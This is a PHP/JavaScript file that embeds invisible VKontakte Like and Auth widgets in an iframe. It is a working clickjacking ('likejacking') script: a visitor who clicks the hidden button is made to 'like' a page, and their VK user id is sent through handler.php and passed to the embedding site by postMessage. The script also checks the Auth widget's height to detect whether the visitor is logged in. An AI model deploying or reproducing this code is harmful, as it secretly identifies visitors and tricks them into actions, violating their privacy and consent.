<?php
require_once "inc.php";

if (is_get() && isset($_GET["key"])) {
    $key = clear_str($_GET["key"]);
    $domain = check_domain($key, $config["domains"]);

    if ($domain) {
        $site_url = "http://" . $domain;
        $page_id = rand(1, 99999999);
        $page_url = "http://" . $config["script_dir"] . "?mypp=" . $page_id;
?>
<!DOCTYPE HTML>
<html>
<head>
    <meta charset="utf-8"/>
    <title>iframe</title>
    <script src="//vk.com/js/api/openapi.js?117" type="text/javascript"></script>
    <style type="text/css">
        html, body {
            margin: 0;
            padding: 0;
        }
        #vkwidget1_tt {
            display: none !important;
        }
        #vk_auth,
        #vk_like {
            opacity: 0;
        }
        #vk_like {
            left: -25px;
            top: -96px;
        }
    </style>
</head>
<body>
    <div id="vk_auth"></div>
    <div id="vk_like"></div>
    <script type="text/javascript">
        var apiId = <?php echo($config["vk_api_id"]);?>;

        VK.init({
            apiId: apiId
        });

        VK.Widgets.Like("vk_like", {
            type: "button",
            height: 24,
            page_id: "<?php echo($page_id);?>",
            pageUrl: "<?php echo($page_url);?>"
        });

        VK.Observer.subscribe("widgets.like.liked", function f(){
            top.postMessage("catched", "<?php echo($site_url);?>");

            var reqQuery = "apiId=" + apiId + "&" + "pageId=" + <?php echo($page_id);?> + "&" + "key=" + encodeURIComponent("<?php echo($key);?>");

            function getXmlHttpRequest(){
                if(window.XMLHttpRequest){
                    try{
                        return new XMLHttpRequest();
                    }catch(e){};
                }else if(window.ActiveXObject){
                    try{
                        return new ActiveXObject('Msxml2.XMLHTTP');
                    }catch(e){};

                    try{
                        return new ActiveXObject('Microsoft.XMLHTTP');
                    }catch(e){};
                };

                return null;
            };

            var req = getXmlHttpRequest();

            req.onreadystatechange = function(){
                if(req.readyState == 4){
                    if(req.status == 200){
                        var data = req.responseText;

                        setTimeout('top.postMessage("user_id:' + data + '", "<?php echo($site_url);?>")', 1);
                        setTimeout('top.postMessage("done", "<?php echo($site_url);?>")', 100);
                    };
                };
            };

            req.open("POST", "handler.php", true);
            req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            req.setRequestHeader("Content-Length", reqQuery.length);
            req.send(reqQuery);
        });
        VK.Observer.subscribe("widgets.like.unliked", function f(){});

        VK.Widgets.Auth("vk_auth", {
            width: "200px",
            authUrl: "/dev/Auth"
        });

        VK.Auth.getLoginStatus(function(){
            f=0;
            setInterval(function(){
                h = parseInt(document.getElementById("vk_auth").style.height);

                if(h==80 || f){
                    return;
                };

                f=1;
                if(h==85 || h==87){
                    top.postMessage("no_auth", "<?php echo($site_url);?>");

                    return;
                };
            }, 100);
        });
    </script>
</body>
</html>
<?php
        }
    }
?>
